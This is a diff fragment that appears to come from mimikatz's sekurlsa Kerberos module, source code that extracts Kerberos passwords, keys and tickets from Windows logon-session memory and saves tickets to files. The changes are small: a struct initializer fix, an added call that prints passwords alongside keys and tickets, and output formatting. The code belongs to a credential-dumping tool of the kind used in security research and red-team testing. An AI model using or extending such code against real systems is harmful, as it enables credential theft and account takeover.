@@ -126,7 +126,7 @@ const KERB_INFOS kerbHelper[] = {
 	},
 };
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_single_package[] = {&kuhl_m_sekurlsa_kerberos_package};
 
 NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[])
@@ -179,6 +179,8 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_tickets(IN PKIWI_BASIC_SECU
 	PKIWI_KERBEROS_ENUM_DATA_TICKET ticketData = (PKIWI_KERBEROS_ENUM_DATA_TICKET) pOptionalData;
 	DWORD i;
 	kuhl_m_sekurlsa_printinfos_logonData(pData);
+	kuhl_m_sekurlsa_enum_kerberos_callback_passwords(pData, Localkerbsession, RemoteLocalKerbSession, NULL);
+	kprintf(L"\n");
 	for(i = 0; i < 3; i++)
 	{
 		kprintf(L"\n\tGroup %u - %s", i, KUHL_M_SEKURLSA_KERBEROS_TICKET_TYPE[i]);
@@ -194,7 +196,8 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURIT
 	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
 	{
 		kuhl_m_sekurlsa_printinfos_logonData(pData);
-		kprintf(L"\n\tKey List @ %p\n", RemoteLocalKerbSession.address);
+		kuhl_m_sekurlsa_enum_kerberos_callback_passwords(pData, Localkerbsession, RemoteLocalKerbSession, NULL);
+		kprintf(L"\n\t * Key List :\n");
 		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
 		{
 			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
@@ -391,7 +394,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket))
 								{
 									if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
-										kprintf(L"\n\t   * Saved to file %s !\n", filename);
+										kprintf(L"\n\t   * Saved to file %s !", filename);
 									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 									LocalFree(App_KrbCred);
 								}
